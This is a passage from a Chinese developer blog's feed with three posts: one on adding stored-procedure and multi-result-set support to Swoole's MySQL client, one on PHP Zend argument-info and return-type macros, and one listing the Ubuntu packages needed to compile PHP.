    <updated>2018-07-16T16:06:50.000Z</updated>
    
    <content type="html"><![CDATA[<p>大概是在一个月前了…那时候刚开始给swoole contribute代码, 初生牛犊, 修了不少小bug, 最后某位仁兄贴了个issue说swoole的mysql-client搞不掂存储过程, 当时我想想, 存储过程这东西实在没什么用, 甚至在很多大公司开发手册上是禁止使用的(某里粑粑), 具体的 <a href="https://www.zhihu.com/question/57545650" target="_blank" rel="noopener"><strong>为什么不要使用存储过程</strong></a> 戳这里, 但是考虑到一个作为一个底层扩展, 各种用户都有, rango就给我分配了这个任务, 于是我就马上进行了一番研究.</p><p>其实内容当时在PR里都贴了, <a href="https://github.com/swoole/swoole-src/pull/1688" target="_blank" rel="noopener">https://github.com/swoole/swoole-src/pull/1688</a>, 现在在博客补个票</p><p>完整的MySQL存储过程支持</p><hr><p>做了以下几件事:</p><h2 id="fetch-mode"><a href="#fetch-mode" class="headerlink" title="fetch mode"></a>fetch mode</h2><p>一开始先想着和PDO一样给Swoole做一个fetch模式</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">'fetch_mode'</span> =&gt; <span class="keyword">true</span>] <span class="comment">//连接配置里加入这个</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$stmt = $db-&gt;prepare(<span class="string">'SELECT `id` FROM `userinfo` LIMIT 2'</span>);</span><br><span class="line">$stmt-&gt;execute(); <span class="comment">// true = success</span></span><br><span class="line">$stmt-&gt;fetch(); <span class="comment">// result-set array 1</span></span><br><span class="line">$stmt-&gt;fetch(); <span class="comment">// result-set array 2</span></span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="分离client和statement"><a href="#分离client和statement" class="headerlink" title="分离client和statement"></a>分离client和statement</h2><p>加了一个 <code>MYSQL_RESPONSE_BUFFER</code> 宏, 处理了一些代码分离了client和statement的buffer</p><p>并给statement结构上也挂了一个result的zval指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ...</span><br><span class="line">    swString *<span class="built_in">buffer</span>; <span class="comment">/* save the mysql multi responses data */</span></span><br><span class="line">    zval *result; <span class="comment">/* save the zval array result */</span></span><br><span class="line">&#125; mysql_statement;</span><br></pre></td></tr></table></figure><p>这样就可以实现以下代码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$stmt1 = $db-&gt;prepare(<span class="string">'SELECT * FROM ckl LIMIT 1'</span>);</span><br><span class="line">$stmt1-&gt;execute();</span><br><span class="line">$stmt2 = $db-&gt;prepare(<span class="string">'SELECT * FROM ckl LIMIT 2'</span>);</span><br><span class="line">$stmt2-&gt;execute();</span><br><span class="line">$stmt1-&gt;fetchAll();</span><br><span class="line">$stmt2-&gt;fetchAll();</span><br></pre></td></tr></table></figure><p>因为现在result是挂在statement上的, 和client分离干净, 就不会因为这样的写法产生错误</p><p>当然这并没有多大用, <strong>主要还是为了后面处理多响应多结果集</strong></p><h2 id="分离mysql-parse-response"><a href="#分离mysql-parse-response" class="headerlink" title="分离mysql_parse_response"></a>分离mysql_parse_response</h2><p>这样就就可以在除了<code>onRead</code>回调之外的别的地方复用这个方法, 处理多结果集了</p><h2 id="存储过程"><a href="#存储过程" class="headerlink" title="存储过程"></a>存储过程</h2><p>存储过程会返回多个响应, 如果和swoole之前的设计一样, 一次性全返回是不太现实的</p><p>PDO和MySQLi的设计都是用一个 next 方法来切换到下一个响应</p><p>刚开始是想做一个链表存储多个响应, 很快就发现并不需要</p><p>所以首先做了一个 <a href="https://github.com/twose/swoole-src/blob/13ff4ff8ac2723649f05b69f337f49557cf74546/swoole_mysql.c#L1478" target="_blank" rel="noopener"><code>mysql_is_over</code></a>方法</p><p>它用来<strong>校验MySQL包的完整性</strong>, 这是swoole以前没有的, 所以在之前的PR后虽然可以使用存储过程, 但是并不能每次都收到完整的响应包, 第一次没收到的包会被丢弃</p><p>然后说一下几个注意点</p><ol><li>MySQL协议决定了并不能倒着检查status flag, 我们必须把每个包的包头都扫描一遍, 通过package length快速扫描到最后一个已接收的包体, 这里只是每次只是检查每个包前几个字节, 消耗不大</li><li>MySQL其它包体中的 <code>MYSQL_SERVER_MORE_RESULTS_EXISTS</code> 的标志位并不准确, 不可采信, 只有<code>eof</code>和<code>ok</code>包中的是准确的 (这里一定要注意)</li><li>在存储过程中执行一个耗时操作的话, recv一次性收不完, 而且会等很久, 这时候需要return等下一次onRead触发(之前的代码里是continue阻塞), 这就不得不在client上加一个check_offset来保存上次完整性校验的位置, 从上个位置开始继续校验后续的MySQL包是否完整, 节省时间</li><li>存储过程中遇到错误(error响应)就可以直接终止接收了</li><li>在PHP7的zval使用上踩了点坑, 现在理解了, 幸好有鸟哥的文章<a href="https://github.com/laruence/php7-internal/blob/master/zval.md" target="_blank" rel="noopener">zval</a>给我解惑..</li></ol><p><strong>校验包的完整性直到所有数据接收完毕</strong></p><p>(分离了client和statement后, execute获取的数据是被存在<code>statement-&gt;buffer</code>里而不是<code>client-&gt;buffer</code>)</p><p><strong>这时候onRead中只会解析第一个响应的结果, 并置到statement对象上, 而剩下的数据仍在buffer中, 并等待nextResult来推动offset解析下一个, 可以说是懒解析了, 有时候会比一次性解析所有响应划算, 而且我们可以清楚的知道每一次nextResult切换前后, 对应的affected_rows和insert_id的值(如果一次性读完, 只能知道最后的)</strong></p><p>最后效果就是以下代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$stmt = $db-&gt;prepare(<span class="string">'CALL reply(?)'</span>);</span><br><span class="line">$stmt-&gt;execute([<span class="string">'hello mysql!'</span>]); <span class="comment">// true</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    $res = $stmt-&gt;fetchAll();</span><br><span class="line">    var_dump($res);</span><br><span class="line">&#125; <span class="keyword">while</span> ($stmt-&gt;nextResult());</span><br></pre></td></tr></table></figure><p>非fetch_mode模式下这么写</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$stmt = $db-&gt;prepare(<span class="string">'CALL reply(?)'</span>);</span><br><span class="line">$res = $stmt-&gt;execute([<span class="string">'hello mysql!'</span>]); <span class="comment">// the first result</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    var_dump($res);</span><br><span class="line">&#125; <span class="keyword">while</span> ($res = $stmt-&gt;nextResult());</span><br></pre></td></tr></table></figure><p>比较巧妙的是nextResult推到最后一个response_ok包的时候会返回null, while循环终止, 我们就可以在循环后读取ok包的affected_rows, 如果最后存储过程最后一个语句是insert成功, 这里会显示1</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump($stmt-&gt;affected_rows); <span class="comment">//1</span></span><br></pre></td></tr></table></figure><p>最近忙起来真的是很少时间能写文章了, 慢慢补吧.</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;大概是在一个月前了…那时候刚开始给swoole contribute代码, 初生牛犊, 修了不少小bug, 最后某位仁兄贴了个issue说swoole的mysql-client搞不掂存储过程, 当时我想想, 存储过程这东西实在没什么用, 甚至在很多大公司开发手册上是禁止使用的(某里粑粑), 具体的 &lt;a href=&quot;https://www.zhihu.com/question/57545650&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;&lt;strong&gt;为什么不要使用存储过程&lt;/strong&gt;&lt;/a&gt; 戳这里, 但是考虑到一个作为一个底层扩展, 各种用户都有, rango就给我分配了这个任务, 于是我就马上进行了一番研究.&lt;/p&gt;
&lt;p&gt;其实内容当时在PR里都贴了, &lt;a href=&quot;https://github.com/swoole/swoole-src/pull/1688&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/swoole/swoole-src/pull/1688&lt;/a&gt;, 现在在博客补个票&lt;/p&gt;
&lt;p&gt;完整的MySQL存储过程支持&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;做了以下几件事:&lt;/p&gt;
&lt;h2 id=&quot;fetch-mode&quot;&gt;&lt;a href=&quot;#fetch-mode&quot; class=&quot;headerlink&quot; title=&quot;fetch mode&quot;&gt;&lt;/a&gt;fetch mode&lt;/h2&gt;&lt;p&gt;一开始先想着和PDO一样给Swoole做一个fetch模式&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;[&lt;span class=&quot;string&quot;&gt;&#39;fetch_mode&#39;&lt;/span&gt; =&amp;gt; &lt;span class=&quot;keyword&quot;&gt;true&lt;/span&gt;] &lt;span class=&quot;comment&quot;&gt;//连接配置里加入这个&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$stmt = $db-&amp;gt;prepare(&lt;span class=&quot;string&quot;&gt;&#39;SELECT `id` FROM `userinfo` LIMIT 2&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$stmt-&amp;gt;execute(); &lt;span class=&quot;comment&quot;&gt;// true = success&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$stmt-&amp;gt;fetch(); &lt;span class=&quot;comment&quot;&gt;// result-set array 1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$stmt-&amp;gt;fetch(); &lt;span class=&quot;comment&quot;&gt;// result-set array 2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="mysql" scheme="http://www.twosee.cn/tags/mysql/"/>
    
      <category term="swoole" scheme="http://www.twosee.cn/tags/swoole/"/>
    
  </entry>
  
  <entry>
    <title>PHP内核 - ZEND_BEGIN_ARG_WITH_RETURN_TYPE_INFO_EX 分析</title>
    <link href="http://www.twosee.cn/2018/07/15/php-zend-arg-info/"/>
    <id>http://www.twosee.cn/2018/07/15/php-zend-arg-info/</id>
    <published>2018-07-15T02:38:48.000Z</published>
    <updated>2018-07-16T16:07:09.000Z</updated>
    
    <content type="html"><![CDATA[<p>前一部分内容抄自振宇哥的博客: <a href="http://kuangjue.com/article/70" target="_blank" rel="noopener">旷绝一世</a>, 在此基础后续扩写一部分</p><p>我们在写扩展的时候很常见的这样的宏，就比如swoole扩展中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ZEND_BEGIN_ARG_INFO_EX(arginfo_swoole_server_listen, 0, 0, 3)&#x2F;&#x2F;名字,unused,引用返回,参数个数</span><br><span class="line">  ZEND_ARG_INFO(0, host)</span><br><span class="line">  ZEND_ARG_INFO(0, port)</span><br><span class="line">  ZEND_ARG_INFO(0, sock_type)</span><br><span class="line">ZEND_END_ARG_INFO()</span><br></pre></td></tr></table></figure><p>这个宏组合是用来定义函数的参数，我们不妨去跟下<code>ZEND_BEGIN_ARG_INFO_EX</code> 与<code>ZEND_END_ARG_INFO</code>的定义。<br>定义在zend_API.h文件中，<code>ZEND_BEGIN_ARG_INFO_EX</code>的定义为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ZEND_BEGIN_ARG_INFO_EX(name, _unused, return_reference, required_num_args)  \</span></span><br><span class="line">   <span class="keyword">static</span> <span class="keyword">const</span> zend_internal_arg_info name[] = &#123; \</span><br><span class="line">   &#123;(<span class="keyword">const</span> <span class="keyword">char</span>*)(<span class="keyword">zend_uintptr_t</span>)(required_num_args), <span class="number">0</span>, return_reference, <span class="number">0</span> &#125;,</span><br></pre></td></tr></table></figure><p>ZEND_END_ARG_INFO的定义为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ZEND_ARG_INFO(pass_by_ref, name)&#123; #name, 0, pass_by_ref, 0&#125;,</span></span><br></pre></td></tr></table></figure><p>那么组合起来变成c代码就是<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> zend_internal_arg_info arginfo_swoole_server_listen[] = &#123; \</span><br><span class="line">   &#123;<span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span> &#125;,</span><br><span class="line">   &#123; host, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;,</span><br><span class="line">   &#123; port, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;,</span><br><span class="line">   &#123; sock_type, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><a id="more"></a></p><p>现在看来就是定义了一个zend_internal_arg_info结构数组，在zend/zend_compile.h文件中定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">zend_internal_arg_info</span> &#123;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *name;      <span class="comment">//参数名称</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *class_name;  <span class="comment">//当参数类型为类时，指定类的名称</span></span><br><span class="line">    zend_uchar type_hint;    <span class="comment">//参数类型是否为数组</span></span><br><span class="line">    zend_uchar pass_by_reference;  <span class="comment">//是否设置为引用，即&amp;</span></span><br><span class="line">    zend_bool allow_null;   <span class="comment">//是否允许设置为空</span></span><br><span class="line">    zend_bool is_variadic;<span class="comment">//**是否为可变参数**</span></span><br><span class="line">&#125; zend_internal_arg_info;</span><br></pre></td></tr></table></figure><p>PHP7中还加入了返回值类型声明这一新特性, 但是到目前为止, 各种扩展几乎没有添加返回值声明的意思, 但是这一特性对于IDE提示的生成非常有帮助</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ZEND_BEGIN_ARG_WITH_RETURN_TYPE_INFO_EX(name, return_reference, required_num_args, type, allow_null) \</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> zend_internal_arg_info name[] = &#123; \</span><br><span class="line">&#123; (<span class="keyword">const</span> <span class="keyword">char</span>*)(<span class="keyword">zend_uintptr_t</span>)(required_num_args), ZEND_TYPE_ENCODE(type, allow_null), return_reference, <span class="number">0</span> &#125;,</span><br><span class="line"></span><br><span class="line">#define ZEND_BEGIN_ARG_WITH_RETURN_TYPE_INFO(name, type, allow_null) \</span><br><span class="line">ZEND_BEGIN_ARG_WITH_RETURN_TYPE_INFO_EX(name, <span class="number">0</span>, <span class="number">-1</span>, type, allow_null)</span><br></pre></td></tr></table></figure><p>在ZEND API头文件中我们可以看到新添加的宏<code>ZEND_BEGIN_ARG_WITH_RETURN_TYPE_INFO_EX</code>, 还有<code>ZEND_BEGIN_ARG_WITH_RETURN_OBJ_INFO_EX</code>等等</p><p>我们可以这样使用它</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ZEND_BEGIN_ARG_WITH_RETURN_OBJ_INFO_EX(arginfo_swoole_http2_client_coro_recv, <span class="number">0</span>, <span class="number">1</span>, Swoole\\Http2\\Response, <span class="number">0</span>)</span><br><span class="line">ZEND_END_ARG_INFO()</span><br><span class="line">    </span><br><span class="line">ZEND_BEGIN_ARG_WITH_RETURN_TYPE_INFO(arginfo_swoole_http2_client_coro_balabala, _IS_BOOL, <span class="number">0</span>)</span><br><span class="line">ZEND_END_ARG_INFO()</span><br></pre></td></tr></table></figure><p>这样就可以为这个方法声明返回值类型了</p><p>当然, 我实际并没有这么做, 因为好像<code>ZEND_BEGIN_ARG_WITH_RETURN_OBJ_INFO_EX</code>这个宏在PHP7最初版本有<a href="https://github.com/php/php-src/commit/141d1ba9801f742dc5d9ccd06e02b94284c4deb7" target="_blank" rel="noopener">BUG</a>, 我们可以通过git blame看到几次修复, 而且并没有看到任何扩展使用了它, 如果要使用, 需要添加一些版本判断, 实在麻烦, 而且指不定会出什么问题, 这个需求也不是特别重要, 而且全部使用它工程量挺大的, 可能需要过一阵子再考虑统一添加一下</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前一部分内容抄自振宇哥的博客: &lt;a href=&quot;http://kuangjue.com/article/70&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;旷绝一世&lt;/a&gt;, 在此基础后续扩写一部分&lt;/p&gt;
&lt;p&gt;我们在写扩展的时候很常见的这样的宏，就比如swoole扩展中：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;ZEND_BEGIN_ARG_INFO_EX(arginfo_swoole_server_listen, 0, 0, 3)&amp;#x2F;&amp;#x2F;名字,unused,引用返回,参数个数&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  ZEND_ARG_INFO(0, host)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  ZEND_ARG_INFO(0, port)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  ZEND_ARG_INFO(0, sock_type)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ZEND_END_ARG_INFO()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这个宏组合是用来定义函数的参数，我们不妨去跟下&lt;code&gt;ZEND_BEGIN_ARG_INFO_EX&lt;/code&gt; 与&lt;code&gt;ZEND_END_ARG_INFO&lt;/code&gt;的定义。&lt;br&gt;定义在zend_API.h文件中，&lt;code&gt;ZEND_BEGIN_ARG_INFO_EX&lt;/code&gt;的定义为：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; ZEND_BEGIN_ARG_INFO_EX(name, _unused, return_reference, required_num_args)  \&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; zend_internal_arg_info name[] = &amp;#123; \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &amp;#123;(&lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt;*)(&lt;span class=&quot;keyword&quot;&gt;zend_uintptr_t&lt;/span&gt;)(required_num_args), &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, return_reference, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; &amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;ZEND_END_ARG_INFO的定义为：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; ZEND_ARG_INFO(pass_by_ref, name)&amp;#123; #name, 0, pass_by_ref, 0&amp;#125;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;那么组合起来变成c代码就是&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; zend_internal_arg_info arginfo_swoole_server_listen[] = &amp;#123; \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &amp;#123;&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; &amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &amp;#123; host, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &amp;#123; port, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &amp;#123; sock_type, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br&gt;
    
    </summary>
    
    
      <category term="PHP" scheme="http://www.twosee.cn/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu下编译PHP所需的依赖库</title>
    <link href="http://www.twosee.cn/2018/06/13/Ubuntu-PHP/"/>
    <id>http://www.twosee.cn/2018/06/13/Ubuntu-PHP/</id>
    <published>2018-06-13T07:52:22.000Z</published>
    <updated>2018-06-14T04:09:09.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="编译环境"><a href="#编译环境" class="headerlink" title="编译环境"></a>编译环境</h4><p><code>sudo apt-get install -y build-essential</code></p><h4 id="xml"><a href="#xml" class="headerlink" title="xml"></a>xml</h4><p><code>sudo apt-get install -y libxml2-dev</code></p><h4 id="pcre"><a href="#pcre" class="headerlink" title="pcre"></a>pcre</h4><p><code>sudo apt-get install -y libpcre3-dev</code></p><h4 id="jpeg"><a href="#jpeg" class="headerlink" title="jpeg"></a>jpeg</h4><p><code>sudo apt-get install -y libjpeg62-dev</code></p><a id="more"></a><h4 id="freetype"><a href="#freetype" class="headerlink" title="freetype"></a>freetype</h4><p><code>sudo apt-get install -y libfreetype6-dev</code></p><h4 id="png"><a href="#png" class="headerlink" title="png"></a>png</h4><p><code>sudo apt-get install -y libpng12-dev libpng3 libpnglite-dev</code></p><h4 id="iconv"><a href="#iconv" class="headerlink" title="iconv"></a>iconv</h4><p><code>sudo apt-get install -y libiconv-hook-dev libiconv-hook1</code></p><h4 id="mycrypt"><a href="#mycrypt" class="headerlink" title="mycrypt"></a>mycrypt</h4><p><code>sudo apt-get install -y libmcrypt-dev libmcrypt4</code></p><h4 id="mhash"><a href="#mhash" class="headerlink" title="mhash"></a>mhash</h4><p><code>sudo apt-get install -y libmhash-dev libmhash2</code></p><h4 id="openssl"><a href="#openssl" class="headerlink" title="openssl"></a>openssl</h4><p><code>sudo apt-get install -y libltdl-dev libssl-dev</code></p><h4 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h4><p><code>sudo apt-get install -y libcurl4-openssl-dev</code></p><h4 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h4><p><code>sudo apt-get install -y libmysqlclient-dev</code></p><h4 id="imagick"><a href="#imagick" class="headerlink" title="imagick"></a>imagick</h4><p><code>sudo apt-get install -y libmagickcore-dev libmagickwand-dev</code></p><h4 id="readline"><a href="#readline" class="headerlink" title="readline"></a>readline</h4><p><code>sudo apt-get install -y libedit-dev</code></p><h4 id="ubuntu-无法找到-iconv"><a href="#ubuntu-无法找到-iconv" class="headerlink" title="ubuntu 无法找到 iconv"></a>ubuntu 无法找到 iconv</h4><p><code>sudo ln -s /usr/lib/libiconv_hook.so.1.0.0 /usr/lib/libiconv.so</code><br><code>sudo ln -s /usr/lib/libiconv_hook.so.1.0.0 /usr/lib/libiconv.so.1</code></p><h4 id="安装PHP扩展"><a href="#安装PHP扩展" class="headerlink" title="安装PHP扩展"></a>安装PHP扩展</h4><p><code>sudo apt-get install -y autoconf automake m4</code></p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;编译环境&quot;&gt;&lt;a href=&quot;#编译环境&quot; class=&quot;headerlink&quot; title=&quot;编译环境&quot;&gt;&lt;/a&gt;编译环境&lt;/h4&gt;&lt;p&gt;&lt;code&gt;sudo apt-get install -y build-essential&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;xml&quot;&gt;&lt;a href=&quot;#xml&quot; class=&quot;headerlink&quot; title=&quot;xml&quot;&gt;&lt;/a&gt;xml&lt;/h4&gt;&lt;p&gt;&lt;code&gt;sudo apt-get install -y libxml2-dev&lt;/code&gt;&lt;/p&gt;
